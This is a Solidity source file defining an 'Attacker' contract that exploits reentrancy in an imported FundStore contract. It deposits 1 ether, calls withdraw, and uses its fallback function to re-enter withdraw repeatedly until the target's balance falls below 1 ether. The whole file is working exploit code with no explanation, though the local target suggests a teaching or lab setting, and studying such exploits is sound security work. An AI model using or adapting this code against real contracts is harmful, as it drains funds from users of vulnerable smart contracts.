// SPDX-License-Identifier: MIT


pragma solidity ^0.6.10;

import "./FundStore.sol";

contract Attacker {
    
    FundStore public _fundStore;

    constructor(address _etherStoreContract) public {
        _fundStore = FundStore(_etherStoreContract);
    }
    fallback() external payable {
        if (address(_fundStore).balance >= 1 ether) {
            _fundStore.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        _fundStore.deposit{value: 1 ether}();
        _fundStore.withdraw(1 ether);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}